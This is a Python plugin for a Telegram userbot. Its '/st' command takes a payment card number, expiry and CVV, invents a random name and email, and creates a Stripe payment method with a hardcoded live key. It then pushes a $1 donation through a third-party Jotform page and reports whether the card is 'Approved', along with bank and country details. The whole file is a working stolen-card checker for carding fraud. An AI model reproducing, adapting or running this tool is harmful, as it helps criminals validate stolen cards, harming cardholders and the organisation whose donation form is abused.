import httpx
import string
import random
import time
import re

from datetime import datetime
from telethon import events
from ubb import Ubot
from ..func import http


@Ubot.on(events.NewMessage(pattern=r'[!/]st'))
async def st_charge(event):
    cc = event.message.message[len('/st '):]
    reply_msg = await event.get_reply_message()
    if reply_msg:
        cc = reply_msg.message
    ccn, mm, yy, cvv = re.findall(r'\d+', cc)
    
    VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '65', '6011')
    if not ccn.startswith(VALID):
        return await event.reply('**Invalid CC Type**')
    start = time.time()

    letters = string.ascii_lowercase
    First = ''.join(random.choice(letters) for i in range(6))
    Last = ''.join(random.choice(letters) for i in range(6))
    Name = f'{First} {Last}'
    Email = f'{First}.{Last}@gmail.com'
    RND = ''.join(random.choices(string.ascii_letters + string.digits, k = 7))
    
    async with httpx.AsyncClient(http2=True) as client:
        headers = {
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Mobile Safari/537.36",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/x-www-form-urlencoded"
        }
        r = await client.post('https://m.stripe.com/6', headers=headers)
        Muid = r.json()['muid']
        Sid = r.json()['sid']
        Guid = r.json()['guid']

        payload = {
            "type": "card",
            "billing_details[name]": Name,
            "card[number]": ccn,
            "card[cvc]": cvv,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "guid": Guid,
            "muid": Muid,
            "sid": Sid,
            "key": "pk_live_UZ4RnNcYyBRlTSOTjxzpAa6I00hJlvzuuf"
            }
        head = {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "accept": "application/json",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "accept-language": "en-US,en;q=0.9"
            }

        res = await client.post('https://api.stripe.com/v1/payment_methods',
                                data=payload, headers=head)
        Id = res.json()['id']
        DT = datetime.timestamp(datetime.now())
        INDT = int(round(DT * 1000))

        load = {
            "formID": 92395723053661,
            "q8_name[first]": First,
            "q8_name[last]": Last,
            "q9_email": Email,
            "simple_fpc": 10,
            "payment_total_checksum": 1,
            "q10_yourDonation[price]": 1,
            "q10_yourDonation[cc_firstName]": First,
            "q10_yourDonation[cc_lastName]": Last,
            "website": "",
            "newCardFormMobile": 1,
            "embedUrl": "",
            "event_id": f"{INDT}_92395723053661_{RND}",
            "browserDetails": "NA",
            "stripePaymentMethodId": Id,
            "q10_yourDonation[cc_lastFourDigits]": ccn[-4:]
            }
        header = {
          "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.0.0 Mobile Safari/537.36",
          "content-type": "application/x-www-form-urlencoded",
          "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
          "accept-language": "en-US,en;q=0.9"
        }
        req = await client.post('https://submit.jotformz.com/submit/92395723053661/',
                                data=load, headers=header)
        match = re.search(r'message: [\']?([^.]+)', req.text)
        if match:
            em = match[1]
        else:
            em = None
        end = time.time()
        B = await http.get(f'http://binchk-api.vercel.app/bin={ccn[:6]}')
        BE = B.json()
        
        MSG = f'''
**CC**⇝ `{ccn}|{mm}|{yy}|{cvv}`
╠**Msg**⇝ `{em}`
╠**Gate⇝ Stripe 1$**
╠**BIN-INFO⤵**
╠**{BE["brand"]} - {BE["type"]} **
╠**Bank↬ {BE["bank"]}**
╠**Country↬ {BE["code"]}({BE["flag"]})**
╠**Time-Took**⇝ {end-start:0.2f}
⟿**Bot-By**⇝ @Xbinner
'''
        
        if 'security code' in req.text:
            await event.reply(f'✅{MSG}')

        elif req.status_code == 200:
            await event.reply(f'''
✅**CC**⇝ `{ccn}|{mm}|{yy}|{cvv}`
╠**Msg**⇝ `Approved`
╠**Gate**⇝ Stripe 1$
╠**BIN-INFO⤵**
╠**{BE["brand"]} - {BE["type"]} **
╠**Bank↬ {BE["bank"]}**
╠**Country↬ {BE["code"]}({BE["flag"]})**
╠**Time-Took**⇝ {end-start:0.2f}
⟿**Bot-By**⇝ @Xbinner
''')
        else:
            await event.reply(f'❌{MSG}')
